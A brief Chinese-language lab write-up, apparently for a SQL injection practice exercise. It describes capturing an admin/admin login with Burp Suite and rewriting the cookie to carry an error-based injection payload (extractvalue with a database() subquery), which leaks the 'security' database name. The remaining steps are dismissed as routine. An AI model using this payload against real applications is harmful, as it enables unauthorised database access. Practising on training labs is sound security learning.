burp 抓包



proxy 板块

```
admin
admin
```

 第二个forward，界面出现Cookie：uame=admin



改

```
Cookie: uname=admin' and extractvalue(1,concat(0x7e,(select database()),0x7e))#
```

爆出security库

.

.

.

后续为一般操作
